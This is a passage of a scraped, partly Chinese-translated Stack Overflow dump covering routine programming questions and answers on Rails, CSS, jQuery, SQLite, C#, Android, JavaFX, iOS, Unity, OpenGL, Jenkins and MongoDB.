              <span class="pull-left" id="completed_checkbox">
               <%= button_to "Completed", complete_task_path(@list.id,task.id), :class => "btn-mini", remote: true %>
              </span>
            <% end %>
          </td>
         </tr>
       </tbody>
      </table>
    <% end %>
  </ul> 
```

However, now I'm getting a

```
No route matches {:action=>"sort", :controller=>"tasks"} 
```

error and I'm not sure why. The update-data-url attribute has a url I got directly from running rake routes, so I'm not sure why I'm getting this error.

Progress (I think), but I'm still stuck.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T18:44:13.337

您可以通过在`<ul>`标签中添加 update-url 列表来解决它：

```
data-update-url="<%= sort_list_tasks_url(@list) %>" 
```

# html - 100% 高度 div

> ID：13221944
> 
> 赞同：1
> 
> 时间：2012-11-04T19:19:00.120
> 
> 标签：html, css

我觉得真的很愚蠢，因为没有看到这里有什么问题。

基本上三个 div 与一个容器连续排列 - 希望它们都与容器一样高。

这是一个简化的测试用例：

[http://codepen.io/jgclifton/full/mDdpv](http://codepen.io/jgclifton/full/mDdpv)

有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T19:22:53.087

给出`div.container`明确的高度，您`div`的 s 将完美排列。目前，它的高度为`auto`，这意味着`height: 100%`在子元素上使用无效。在容器上设置一个高度，例如 200 像素，可以将基于百分比的高度用作参考。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T19:23:57.530

容器有高度：自动；如果将其更改为高度：100px；例如，每个 div 对我来说都有相同的高度。

# javascript - 通过内联 onClick 运行 jQuery 函数并使用函数变量/引用

> ID：13221945
> 
> 赞同：2
> 
> 时间：2012-11-04T19:19:09.310
> 
> 标签：javascript, jquery

我对此很陌生，但我写了这个并认为它第一次会起作用，但我得到一个'ReferenceError：找不到变量：街道'控制台错误。

如果单击“街道”按钮，我会收到此错误。

这是非常基本的，但这是我第一次创建一个函数来使用 onClick 属性中的 var/ref。

请参阅 onClick 标记...

```
<a href="#" title="View Supersport" onclick="bikeFilter(supersport)">Supersport</a>

<a href="#" title="View Street" onclick="bikeFilter(street)">Street</a>

<a href="#" title="View Cruiser" onclick="bikeFilter(cruiser)">Cruiser</a>

<a href="#" title="View Scooter" onclick="bikeFilter(scooter)">Scooter</a>      

<a href="#" title="Motocross" onclick="bikeFilter(motocross)">Motocross</a>

<a href="#" title="Enduro" onclick="bikeFilter(enduro)">Enduro</a>

<a href="#" title="Kids" onclick="bikeFilter(kids)">Kids</a> 
```

那么请看我的函数，它得到了上面的 ref 错误......

**另请注意，我正在尝试在我的函数中使用 onClick var/ref，以便我可以定位与被单击按钮相关的特定元素。**

```
bikeFilter = function (y) {

    $('.bike').fadeOut();

    scrollTo(186);

    $('.bike[data-group=' + y + ']').fadeIn();

    bikeSliderNav();

    bikeSlider();

    return false;

} 
```

任何专家的建议都会非常有帮助。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T19:21:11.930

你应该像这样使用它们：

```
onclick="bikeFilter('motocross')" 
```

不要忘记把 ' 放在你的参数周围

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T19:22:36.327

您可能希望将**字符串**作为输入传递给您的函数，而不是未声明和未实例化变量的名称。

尝试使用单引号将其引用为字符串常量（您需要单引号，因为您已经使用双引号来告诉您的 html 标记属性值）：

```
onclick="bikeFilter('scooter')" 
```

看看[这里](http://eloquentjavascript.net/chapter2.html)，看看 js 中数据类型的区别，[这里](http://eloquentjavascript.net/chapter3.html)是关于函数的快速入门。

# python - preventing updation of specific columns in sqlite from python

> ID：13221947
> 
> 赞同：0
> 
> 时间：2012-11-04T19:19:15.147
> 
> 标签：python, twisted

i am developing a twisted app which interacts with a sqlite backend, in the sqlite db there is a users table of which certain columns should not be updated if they already contain a value. **one way of doing this would be to check the user table before each insert for existence of values in the columns of interest** and proceed accordingly , but this will be a performance killer and people familiar with twisted will know how cumbersome this can be, can someone suggest a better way of doing this .

TIA

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T23:02:20.140

尝试[*INSERT*](http://www.sqlite.org/lang_insert.html)[语句](http://www.sqlite.org/lang_insert.html)[的](http://www.sqlite.org/lang_insert.html)*INSERT OR IGNORE*变体。[](http://www.sqlite.org/lang_insert.html)

# c# - File writing statement does not work properly

> ID：13221949
> 
> 赞同：0
> 
> 时间：2012-11-04T19:19:31.197
> 
> 标签：c#, file, file-io, streamwriter, streamwriter.write

I have the following function:

```
static public void logEntry( string expression, string result )
{
    string content = expression + "=" + result + "\n";
    if (!logFileExists()) File.Create( logFileName );
    StreamWriter sw = new StreamWriter( logFileName );
    sw.Write( content );
    sw.Close();
} 
```

...after these three calls:

```
logEntry( "3/2", "1.5");
logEntry( "8/2", "4");
logEntry( "10/2", "5"); 
```

my file looks like this:

```
10/2=5 
```

instead of this:

```
3/2=1.5
8/2=4
10/2=5 
```

What could I do?

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-04T19:22:26.653

如果文件存在，则使用附加的[StreamWriter构造函数重载](http://msdn.microsoft.com/en-us/library/36b035cb.aspx)

```
using(StreamWriter sw = new StreamWriter( logFileName, true ))
{
     sw.Write( content );
} 
```

此外，如果文件不存在，则此构造函数会创建一个新文件，因此不需要调用 File.Create。

# android - getting error in rest call with key and secret using md5 in android?

> ID：13221952
> 
> 赞同：1
> 
> 时间：2012-11-04T19:19:37.390
> 
> 标签：android, md5

how to make rest call with key and secret using md5 in android? but I am getting an error as a response in loginService() method,

error : {"status":"error","message":"Signature mismatch"}.

the steps I followed, Step 1- I made a string "param" for getting hash string using md5(string) method Step 2- called a method loginService() for getting response from web service

Calling code:

```
{ 
    String param = "name" + first_name + last_name  + "email" + email + "facebook_user_id" + facebook_user_id + "location" + location + "zip_code" + zip_code + "birthday" + birthday + "time" + time + "api_key" + api_key;
    String signature = md5(param);
    Post_Method_Interface commonPost = new CommonPostMethod();
    getResponceForParse = commonPost.loginService(
                first_name + last_name, email,facebook_user_id, location, zip_code, birthday,time, api_key, signature);
    Log.d(">>> GetResponceForParse >>> ",getResponceForParse);

    if (!facebook_user_id.equals(null)) {
            Post_Method_Interface commonPost = new CommonPostMethod();
            getResponceForParse = commonPost
                                .FacebookLoginModel(first_name + last_name,
                                        email, facebook_user_id, location,
                                        zip_code, birthday, time, api_key,
                                        signature);
            Log.d("GetResponceForParse 1", getResponceForParse);
                        Intent i = new Intent(getApplicationContext(),
                                HomeActivity.class);

} 
```

loginService() web service method of Post_method_Interface class,

```
public String loginService(String name, String email,
        String facebook_user_id, String location, String zip_code,
        String birthday, String timestamp, String api_key, String sig) {

    try {
        JSONObject schObject = new JSONObject();
        schObject.put("name", name);
        schObject.put("email", email);
        schObject.put("facebook_user_id", facebook_user_id);
        schObject.put("location", location);
        schObject.put("zip_code", zip_code);
        schObject.put("birthday", birthday);
        schObject.put("time", timestamp);
        schObject.put("api_key", api_key);
        schObject.put("sig", sig);
        String URL = ApiConstant.URL_FacebookLoginModel;
        JsonPostRequest postrequest = new JsonPostRequest();
        InputStream is = postrequest.doPost(schObject, URL);
        response = postrequest.inputSteamToString(is);
        Log.d("Login", response);
    } catch (Exception e) {
        // TODO: handle exception
        e.printStackTrace();
    }
    return response; 
```

}

md5() method:

```
private static final String md5(final String parem) {
try {
    // Create MD5 Hash
    MessageDigest digest = java.security.MessageDigest
            .getInstance("MD5");
    digest.update(parem.getBytes());
    byte messageDigest[] = digest.digest();

    // Create Hex String
    StringBuffer hexString = new StringBuffer();
    for (int i = 0; i < messageDigest.length; i++) {
        String h = Integer.toHexString(0xFF & messageDigest[i]);
        while (h.length() < 2)
            h = "0" + h;
        hexString.append(h);
    }
    return hexString.toString();
} catch (NoSuchAlgorithmException e) {
    e.printStackTrace();
}
return ""; 
```

}

Please help me its a very urjent !!!

# javafx-2 - JavaFX applied transformations seem to block KeyEvents

> ID：13221953
> 
> 赞同：1
> 
> 时间：2012-11-04T19:19:48.953
> 
> 标签：javafx-2

About: I have a panel displaying a map that is constructed out of polygons and lines. To this map I apply transformations and provide a way to walk around (first-person-like) with rotating and moving the map with transformations.

The transformations applied to the map seem to block (or atleast slowdown) KeyEvents from beeing handled. Sometimes the application keeps rotating even if I released the key.

Also I noticed that the rotation transformation has a bigger impact on this effect.

The collision-detection has no effect on this (since its disabled at this point).

Due to the structure of the application I bind centerR to pointerR.

```
centerR.bind(pointerR); 
```

Transformations applied:

```
mapElements = new Group();

Scale s = new Scale();
s.xProperty().bind(zoom);
s.yProperty().bind(zoom);
s.setPivotX(panelBounds.getWidth() / 2);
s.setPivotY(panelBounds.getHeight() / 2);

mapElements.getTransforms().add(s);

Translate t = new Translate();
t.xProperty().bind(new SimpleDoubleProperty(panelBounds.getWidth() / 2).subtract(centerX));
t.yProperty().bind(new SimpleDoubleProperty(panelBounds.getHeight() / 2).subtract(centerY));

mapElements.getTransforms().add(t);

Rotate r = new Rotate();
r.angleProperty().bind(centerR.multiply(-1));
r.pivotXProperty().bind(centerX);
r.pivotYProperty().bind(centerY);

mapElements.getTransforms().add(r); 
```

KeyListener-Setup:

```
setOnKeyPressed(new EventHandler<KeyEvent>()
{
    @Override
    public void handle(KeyEvent event)
    {
        System.out.println(event);
        if (event.getCode() == KeyCode.UP)
            moveForwards = true;
        if (event.getCode() == KeyCode.DOWN)
            moveBackwards = true;
        if (event.getCode() == KeyCode.LEFT)
            rotateLeft = true;
        if (event.getCode() == KeyCode.RIGHT)
            rotateRight = true;
    }
});
setOnKeyReleased(new EventHandler<KeyEvent>()
{
    @Override
    public void handle(KeyEvent event)
    {
        System.out.println(event);
        if (event.getCode() == KeyCode.UP)
            moveForwards = false;
        if (event.getCode() == KeyCode.DOWN)
            moveBackwards = false;
        if (event.getCode() == KeyCode.LEFT)
            rotateLeft = false;
        if (event.getCode() == KeyCode.RIGHT)
            rotateRight = false;
    }
}); 
```

OnFrame-Rotation:

```
private final double    fps     = 20;
private final KeyFrame  frame   = new KeyFrame(Duration.millis(1000 / fps), new EventHandler<ActionEvent>()

{
@Override
public void handle(ActionEvent event)
    {
        double movement = ((moveForwards ? 3 : 0) 
                        + (moveBackwards ? -3 : 0))
                        * movementSpeed;

        double rotation = ((rotateLeft ? -3 : 0) 
                        + (rotateRight ? 3 : 0))
                        * rotateSpeed;

        double oldX = pointerX.get();
        double oldY = pointerY.get(); 

        pointerX.set(pointerX.get() 
                    + Math.cos((pointerR.get() - 90) * Math.PI / 180) 
                    * movement);

        pointerY.set(pointerY.get()
                + Math.sin((pointerR.get() - 90) * Math.PI / 180) 
                    * movement);

        if (checkCollisions)
            handleCollision(oldX, oldY, pointerX.get(), pointerY.get());
        pointerR.set(pointerR.get() + rotation);
    }
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-05T12:21:11.693

您在哪个节点上调用 setOnKeyPressed？查看此方法的 javadoc：

```
Defines a function to be called when this Node or its child Node 
has input focus and a key has been pressed. The function is called 
only if the event hasn't been already consumed during its capturing
or bubbling phase. 
```

如果尚未将侦听器添加到场景中，请确保它已添加到场景中，并且没有调用事件对象上的消耗方法。

# iphone - UITextField Won't Change Frame on Refocus

> ID：13221955
> 
> 赞同：0
> 
> 时间：2012-11-04T19:19:57.440
> 
> 标签：iphone, objective-c, ios, uitextfield, frame

I'm having a peculiar problem. I have a view with two UITextFields that start out 280px wide. On focus, I want them to shorten to reveal a button - I'm doing that with the following code:

```
- (void)textFieldDidBeginEditing:(UITextField *)textField
{
    CGRect revealButton = CGRectMake(textField.frame.origin.x, textField.frame.origin.y, 221, textField.frame.size.height);

    [UIView beginAnimations:nil context:nil];
    textField.frame = revealButton;
    [UIView commitAnimations];
    NSLog(@"%f",textField.frame.size.width);
} 
```

Once editing has ended, they should go back to their original frame:

```
- (void)textFieldDidEndEditing:(UITextField *)textField
{
    CGRect hideButton = CGRectMake(textField.frame.origin.x, textField.frame.origin.y, 280, textField.frame.size.height);

    [UIView beginAnimations:nil context:nil];
    textField.frame = hideButton;
    [UIView commitAnimations];
} 
```

The first time I focus a text field, it works perfectly. However, if I focus the first text field after focusing something else (for example, if I focus the first text field initially, focus the second, and then refocus the first, or if I initially focus the second and then focus the first), it simply won't change its frame. Even more puzzling is the fact that it **will** log 221 as its width - it just won't show that on the screen. Furthermore, this problem doesn't apply to the second text field.

Any ideas? Thanks in advance...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T20:17:41.580

这很奇怪，我使用两个具有完全相同代码的文本字段进行了快速测试，并且每次都有效。

我建议删除文本字段和连接并重建它们。清理所有目标并重试。

**根据您的评论进行编辑**：

如果您使用自动布局，则不得直接修改文本字段的框架。UI元素的实际帧数由系统计算。

出于您的目的，我建议为每个文本字段设置宽度约束。确保除了宽度约束之外，您只有**左右间距约束，而不是两者。**要对其进行动画处理，请使用以下代码：

```
- (NSLayoutConstraint *)widthConstraintForView:(UIView *)view
{
    NSLayoutConstraint *widthConstraint = nil;

    for (NSLayoutConstraint *constraint in textField.constraints)
    {
        if (constraint.firstAttribute == NSLayoutAttributeWidth)
            widthConstraint = constraint;
    }

    return widthConstraint;
}

- (void)animateConstraint:(NSLayoutConstraint *)constraint toNewConstant:(float)newConstant withDuration:(float)duration
{
    [self.view layoutIfNeeded];
    [UIView animateWithDuration:duration animations:^{
        constraint.constant = newConstant;
        [self.view layoutIfNeeded];
    }];
}

- (void)textFieldDidBeginEditing:(UITextField *)textField
{
    float newWidth = 221.0f;

    NSLayoutConstraint *widthConstraint = [self widthConstraintForView:textField];

    [self animateConstraint:widthConstraint toNewConstant:newWidth withDuration:0.5f];
}

- (void)textFieldDidEndEditing:(UITextField *)textField
{
    float newWidth = 280.0f;

    NSLayoutConstraint *widthConstraint = [self widthConstraintForView:textField];

    [self animateConstraint:widthConstraint toNewConstant:newWidth withDuration:0.5f];
} 
```

# unity3d - How do I reference the ServiceStack library in a Unity C# script?

> ID：13221957
> 
> 赞同：5
> 
> 时间：2012-11-04T19:20:03.043
> 
> 标签：unity3d, servicestack

I've got to make a Unity script to import and export some 3D models. I'm trying to reference Servicestack.Redis from my script so I can talk to redis. It compiles fine but unity won't load the library.

I've copied the dll's from Build/Release/MonoDevelop/SericeStack.Redis.zip into my assets folder within unity, (is that correct?) I just got ServiceStack by cloning [https://github.com/ServiceStack/ServiceStack.Redis](https://github.com/ServiceStack/ServiceStack.Redis)

When Unity attempts to load the script it says

```
Internal compiler error. See the console log for more information. output was:
Unhandled Exception: System.Reflection.ReflectionTypeLoadException: The classes in the module cannot be loaded.
  at (wrapper managed-to-native) System.Reflection.Assembly:GetTypes (bool)
  at System.Reflection.Assembly.GetTypes () [0x00000] in <filename unknown>:0 
  at Mono.CSharp.RootNamespace.ComputeNamespaces (System.Reflection.Assembly assembly, System.Type extensionType) [0x00000] in <filename unknown>:0 
  at Mono.CSharp.RootNamespace.ComputeNamespace (Mono.CSharp.CompilerContext ctx, System.Type extensionType) [0x00000] in <filename unknown>:0 
  at Mono.CSharp.GlobalRootNamespace.ComputeNamespaces (Mono.CSharp.CompilerContext ctx) [0x00000] in <filename unknown>:0 
  at Mono.CSharp.Driver.LoadReferences () [0x00000] in <filename unknown>:0 
  at Mono.CSharp.Driver.Compile () [0x00000] in <filename unknown>:0 
  at Mono.CSharp.Driver.Main (System.String[] args) [0x00000] in <filename unknown>:0 
```

My code so far is this. It's an editor script. It just makes a window with a button and when the button is clicked it attempts to connect to redis on localhost and get a key

```
using UnityEngine;
using UnityEditor;
using System.Collections;
using ServiceStack.Redis;

public class MyWindow : EditorWindow
{

    // Add menu item named "My Window" to the Window menu
    [MenuItem("Window/My Window")]
    public static void ShowWindow()
    {
        //Show existing window instance. If one doesn't exist, make one.
        EditorWindow.GetWindow(typeof(MyWindow));
    }

    void OnGUI()
    {
        if (GUILayout.Button("Press to Rotate"))
        {
            ProcessAsset();
        }
    }

    void ProcessAsset()
    {
        using (var client = new RedisClient("localhost"))
        {
            client.Get ("hello");
        }
    }
} 
```

I'm probably just not referencing the library correctly. I'm fairly new to compiled languages.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T06:32:57.060

我有一个类似的错误。但它没有任何自定义 dll。原因是我在代码中使用了[Func 。](http://msdn.microsoft.com/en-us/library/bb549151.aspx)Mono 不支持[Func](http://docs.xamarin.com/ios/about/limitations)。我尝试下载 dll 的源代码，它们使用了很多 Func。因此，这可能是您收到该错误的原因。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-07-30T13:54:55.483

我知道这有点旧，但它出现在我的搜索结果中。因此，对于遇到此问题的任何其他人，请确保您的 Unity 项目设置设置为`.Net 2.0`而不是`.Net 2.0 Subset`.

菜单可以找到`File -> Build Settings -> Player Settings -> Optimization.`

# opengl - OpenGL - Animate/cycle/rotate palette

> ID：13221961
> 
> 赞同：0
> 
> 时间：2012-11-04T19:20:32.570
> 
> 标签：opengl, animation, rotation, palette, 8-bit

I was trying to create a OpenGL version of an old plasma 8bit effect animation in DOS but I am stuck. Since almost every OpenGL program has included something to generate a palette for Win32 I thought it would not be that hard to apply palette animation on my old program.

My purpose is to generate a texture with color indices that does not change and a palette that is rotating. After digging into the web this weekend I am still not able to fix it. I cannot even display a texture with one color index so in that stage something is wrong (if it would work I can create the palette cycling mechanism).

I can force into palette mode by using PFD_TYPE_COLORINDEX and draw some random pixels using glIndexi. I read that glDrawPixels and glReadPixels are slow and the latter is not that accurate when getting pixels back from the framebuffer (due to inaccurate positioning as a result from rounding errors or something).

I tried the GL_COLOR_INDEX keyword. I also tried: glPixelTransferi(GL_MAP_COLOR, true); glPixelMapfv( GL_PIXEL_MAP_I_TO_R, ...); glTexImage2D... Some of the code I tried so far (latest changes):

init part:

```
void* rawplasma;
GLuint  plastexture;

rawplasma = (void*) malloc(256*256);
 memset(rawplasma,rand()%256,256*156);
glEnable( GL_TEXTURE_2D );
glGenTextures(1, plastexture);
glBindTexture(GL_TEXTURE_2D, plastexture);
glTexImage2D( GL_TEXTURE_2D, 0, GL_COLOR_INDEX, 256, 256, 0, GL_COLOR_INDEX, GL_UNSIGNED_BYTE,     rawplasma ); 
```

update/draw:

```
float Rmap[256];
float Gmap[256];
float Bmap[256];
float Amap[256];

glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); 
memset(rawplasma,rand()%256,256*256); //check if it works
glTexImage2D( GL_TEXTURE_2D, 0, GL_COLOR_INDEX, 256, 256, 0, GL_COLOR_INDEX, GL_UNSIGNED_BYTE,     rawplasma );
glBindTexture(GL_TEXTURE_2D, plastexture );
/*
glPixelTransferi( GL_MAP_COLOR, GL_TRUE );
    glPixelMapfv(GL_PIXEL_MAP_I_TO_R,mapSize,Rmap);
    glPixelMapfv(GL_PIXEL_MAP_I_TO_G,mapSize,Gmap);
    glPixelMapfv(GL_PIXEL_MAP_I_TO_B,mapSize,Bmap);
    glPixelMapfv(GL_PIXEL_MAP_I_TO_A,mapSize,Amap);
glPixelTransferi(GL_MAP_COLOR,GL_TRUE);
*/
glBegin(GL_QUADS);
    glTexCoord2f(1.0, 0.0);  glVertex2f(-1.0, -1.0);
    glTexCoord2f(0.0, 0.0);  glVertex2f( 1.0, -1.0);
    glTexCoord2f(0.0, 1.0);  glVertex2f( 1.0,  1.0);
    glTexCoord2f(1.0, 1.0);  glVertex2f(-1.0,  1.0);
glEnd();
glFlush();
SwapBuffers(hDC); 
```

Or should I use glColorTableEXT in combination with GL_COLOR_INDEX8_EXT? I read somewhere that textured palettes are not supported? I found a link which mentions Paletted Texture Extension: [http://www.cs.rit.edu/~ncs/Courses/570/UserGuide/OpenGLonWin-20.html](http://www.cs.rit.edu/~ncs/Courses/570/UserGuide/OpenGLonWin-20.html)

This is what I want (but then in OpenGL):

[http://www.codeforge.com/read/174459/PalAnimDemo.h__html](http://www.codeforge.com/read/174459/PalAnimDemo.h__html)

I am not looking for ES/Shader implementations (I am just a beginner ;)) and DirectDraw might be easier I think but I want to try OpenGL.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T20:29:21.127

> 因为几乎每个 OpenGL 程序都包含一些东西来为 Win32 生成调色板

不，绝对不是。如果您指的是 PIXELFORMATDESCRIPTOR，*那*不是调色板定义。颜色索引模式是在 OpenGL 中使用的主要 PITA，目前没有任何实现真正支持它。

> 我不是在寻找 ES/Shader 实现（我只是一个初学者；））

但这正是您应该使用的。在现代 OpenGL 中，着色器也是*强制性的。*一个简单的片段着色器，它执行对一维纹理的查找，将索引转换为颜色，这正是您所需要的。如果你的目标是现代系统，那么无论如何你都必须使用着色器。

# jenkins - 在 Jenkins 中构建和部署 Zend Framework PHP 应用程序

> ID：13221965
> 
> 赞同：1
> 
> 时间：2012-11-04T19:20:59.543
> 
> 标签：jenkins, zend-framework2, phplint

我正在设置 jenkins 工作来构建和部署 Zend Framework 2 php 应用程序。在我的 ant 构建脚本中，我定义了一个用于验证 php 文件的 lint 作业。

构建作业失败，因为 lint 在 ZF2 库文件中检测到错误。

这是 lint 生成的输出：

```
[apply] PHP Fatal error:  Constructor Zend\Captcha\Factory::factory() cannot be static in /var/lib/jenkins/workspace/XXX/vendor/zendframework/zendframework/library/Zend/Captcha/Factory.php on line 90
[apply] Errors parsing /var/lib/jenkins/workspace/XXX/vendor/zendframework/zendframework/library/Zend/Captcha/Factory.php 
```

有人知道为什么要验证`Zend/Captcha/Factory.php fails`吗？

ANT 任务如下所示：

```
 <target name="lint" description="Perform syntax check of sourcecode files">
  <apply executable="php" failonerror="true">
   <arg value="-l" />

   <fileset dir="${basedir}/">
    <include name="**/*.php" />
    <modified />
   </fileset>

   <fileset dir="${basedir}/tests">
    <include name="**/*.php" />
    <modified />
   </fileset>
  </apply>
 </target> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-04T21:26:55.303

您的问题是因为 Zend Framework 需要 php 5.3.3 或更高版本。由于您的 Jenkins 盒子使用 5.3.2，这会带来各种问题。其中之一显然是您现在遇到的错误。

我认为您之前没有注意到该错误，因为在开发系统上您安装了 5.3.3+。尝试将您的测试环境更新为较新版本的 php，这将消除此特定问题。

**更新**

为了澄清我的回答，php 5.3.3 中有一个向后兼容性中断，它会回到您的环境中。检查[此更改日志](http://nl.php.net/releases/5_3_3.php)，尤其是此声明：

> **向后不兼容的更改：**
> 
> 与命名空间类名的最后一个元素同名的方法将不再被视为构造函数。此更改不会影响非命名空间类。

```
<?php
namespace Foo;
class Bar {
    public function Bar() {
        // treated as constructor in PHP 5.3.0-5.3.2
        // treated as regular method in PHP 5.3.3
    }
}
?> 
```

> 从 5.2.x 迁移没有影响，因为命名空间仅在 PHP 5.3 中引入。

在 的情况下`Zend\Captcha\Factory`，有一个`factory()`静态方法，因此您可以调用`Zend\Captcha\Factory::factory()`. 在 php 4 和 5 到 5.3.2 上，此方法**也被**解析为工厂的构造函数。并且构造函数不能是静态的。

对于这种情况，linter 会给你一个致命的错误。

# css - 在包裹整个 div 之前，最好先包裹在子 div 中

> ID：13221969
> 
> 赞同：5
> 
> 时间：2012-11-04T19:21:33.977
> 
> 标签：css, css-float, word-wrap

我有两个 div，它们在 wrapper-div 中向左浮动，如下所示：

HTML：

```
<div id="container">
    <div id="logo">LOGO</div>
    <div id="nav">Link1 Link2 Link3 Link4</div>
</div>​ 
```

CSS：

```
#container {  }
#logo { float: left; margin-right: 10px; }
#nav { float: left; } 
```

JSFiddle：http: [//jsfiddle.net/vZWTc/277/](http://jsfiddle.net/vZWTc/277/)

减小窗口宽度时会发生什么情况，首先#nav 跳到#logo 下方，然后它开始在里面环绕。有没有办法（使用布局而不是javascript）首先使其在#nav 内包裹到一个阈值（比如150px 宽度），然后当达到该限制时允许它跳到#logo 以下？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T21:20:45.983

我想出的唯一解决方案是有一个固定大小的左栏（即左徽标 div）。如果它是固定的，右窗格可以有一个左边距来为其腾出空间并占据其余空间，并在必要时用它来换行文本。这样做的缺点是，如果窗口缩小太多，它不会跳到左侧浮动 div 下方，因为 nav 或 navcontent css 没有浮动。

示例可在[http://jsfiddle.net/vZWTc/278/](http://jsfiddle.net/vZWTc/278/)获得，并附有一些额外的显示文本，但在此处简言之。

```
<div id="container">
    <div id="logo">LOGO</div>
    <div id="nav">
        <div id="navcontent">
            <p>Link1 Link2 Link3 Link4</p>
        </div>
    </div>
</div>​ 
```

```
#logo {
    float: left;
    margin-right: 10px;
}
#nav {
    display: block;
}
#navcontent {
    margin-left: 100px;
} 
```

# java - onTouch 与多点触控和 SoundPool 运动事件

> ID：13221970
> 
> 赞同：1
> 
> 时间：2012-11-04T19:21:38.033
> 
> 标签：java, android, touch-event, ontouchlistener, soundpool

所以我正在为 android 制作一个木琴应用程序，但我遇到了一个问题，我不确定如何正确使用 onTouch。现在我可以按下一个图像并播放声音，但我不能同时播放两个声音，也不能将手指滑下木琴并播放所有声音，它只会播放第一个按下的图像。我知道这是因为 onTouch 和 Multitouch，但我不知道该怎么做，也找不到任何相关的示例代码，感谢您的帮助！

这是我的主要活动

```
public class Xylophone extends Activity {
private Player mSoundManager;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_xylophone);
    mSoundManager = new Player();
    mSoundManager.initSounds(getBaseContext());
    mSoundManager.addSound(1, R.raw.note01);
    mSoundManager.addSound(2, R.raw.note02);
    mSoundManager.addSound(3, R.raw.note03);
    mSoundManager.addSound(4, R.raw.note04);
    mSoundManager.addSound(5, R.raw.note05);
    mSoundManager.addSound(6, R.raw.note06);
    mSoundManager.addSound(7, R.raw.note07);
    mSoundManager.addSound(8, R.raw.note08);

    ImageView img01 = (ImageView) findViewById(R.id.imageView1);
    img01.setOnTouchListener(new OnTouchListener() {    

        @Override
        public boolean onTouch(View v, MotionEvent event) {
            mSoundManager.playSound(1);
            return false;
        }           
    });

    ImageView img02 = (ImageView) findViewById(R.id.imageView2);
    img02.setOnTouchListener(new OnTouchListener() {    

        @Override
        public boolean onTouch(View v, MotionEvent event) {
            mSoundManager.playSound(2);
            return false;
        }           
    }); 
```

这是我的 SoundPool 活动

```
public class Player {

private  SoundPool mSoundPool; 
private  HashMap<Integer, Integer> mSoundPoolMap; 
private  AudioManager  mAudioManager;
private  Context mContext;

public Player()
{

}

public void initSounds(Context theContext) { 
     mContext = theContext;
     mSoundPool = new SoundPool(8, AudioManager.STREAM_MUSIC, 0); 
     mSoundPoolMap = new HashMap<Integer, Integer>(); 
     mAudioManager = (AudioManager)mContext.getSystemService(Context.AUDIO_SERVICE);         
} 

public void addSound(int Index,int SoundID)
{
    mSoundPoolMap.put(Index, mSoundPool.load(mContext, SoundID, 1));
}

public void playSound(int index) { 

     int streamVolume = mAudioManager.getStreamVolume(AudioManager.STREAM_MUSIC); 
     mSoundPool.play(mSoundPoolMap.get(index), streamVolume, streamVolume, 1, 0, 1f); 
}

public void playLoopedSound(int index) { 

     int streamVolume = mAudioManager.getStreamVolume(AudioManager.STREAM_MUSIC); 
     mSoundPool.play(mSoundPoolMap.get(index), streamVolume, streamVolume, 1, -1, 1f); 
} 
```

}

这是我的布局

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:tools="http://schemas.android.com/tools"
android:layout_width="match_parent"
android:layout_height="match_parent" >

<LinearLayout
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:layout_centerVertical="true"
    android:orientation="horizontal" >

    <ImageView
        android:id="@+id/imageView1"
        android:layout_width="0dp"
        android:layout_height="match_parent"
        android:layout_weight="1"
        android:adjustViewBounds="true"
        android:cropToPadding="false"
        android:scaleType="fitXY"
        android:src="@drawable/button01" />

    <ImageView
        android:id="@+id/imageView2"
        android:layout_width="0dp"
        android:layout_height="match_parent"
        android:layout_weight="1"
        android:scaleType="fitXY"
        android:src="@drawable/button02" /> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:41:37.707

希望你直到现在才弄清楚。仍然是我对此的看法：首先，您的第二堂课 SoundPool**不是**一项活动。

您必须尝试的不是覆盖每个按钮的 onTouch 方法。

* * *

相反，在您的主要活动中，使其实现 OnTouchListener。

然后，当然，您需要实现/覆盖 OnTouchListener 的方法。因此，现在，如果您将主视图和/或每个按钮（*自己看看哪个有效！*）注册到 OnTouchListener，您将获得所有触摸（以及多点触摸）。

查看[MotionEvent](http://developer.android.com/reference/android/view/MotionEvent.html)类以获取更多详细信息

```
public class Xylophone extends Activity implements onTouchLister{
    public static final String TAG = "Xylophone";
    @Override
    public void onCreate(Bundle savedInstanceState) {
        /*Either have your parent view register THIS (Xylophone) as its listener, or have each button register THIS(Xylophone) as its listener.*/
        yourParentView.setOnTouchListener(this);
        //or
        img02.setOnTouchListener(this);
    }

    @Override
    public boolean onTouch(View v, MotionEvent event) {
        Log.i(TAG, "ID:" + Integer.toString(v.getId()));
        Log.i(TAG, "Pointer count: " + event.getPointerCount());        
        Log.i(TAG, "Action: " + event.getActionMasked());
        Log.i(TAG, "Action index: " + event.getActionIndex());
    } 
```

# php - MongoDB && PHP 中的 NumberLong()

> ID：13221971
> 
> 赞同：1
> 
> 时间：2012-11-04T19:21:39.100
> 
> 标签：php, mongodb

```
db.projects.find()
{ 
  "_id" : ObjectId("508d4028e60d8c2154a2eb36"), 
  "date" : NumberLong(1351432927), 
  "deadline" : "2012-12-31", 
  "payment" : "100500", 
  "title" : "Project", 
  "userid" : ObjectId("5083677d2f5c849509c3aae6") 
} 
```

好吧，但在 PHP`print_r($find_result)`中根本不显示关键的“*日期*”！
为什么？以及如何从`NumberLong()`PHP 中提取价值？

# jquery - 使用jquery隐藏页面中的最后一个div

> ID：13221972
> 
> 赞同：0
> 
> 时间：2012-11-04T19:21:46.240
> 
> 标签：jquery

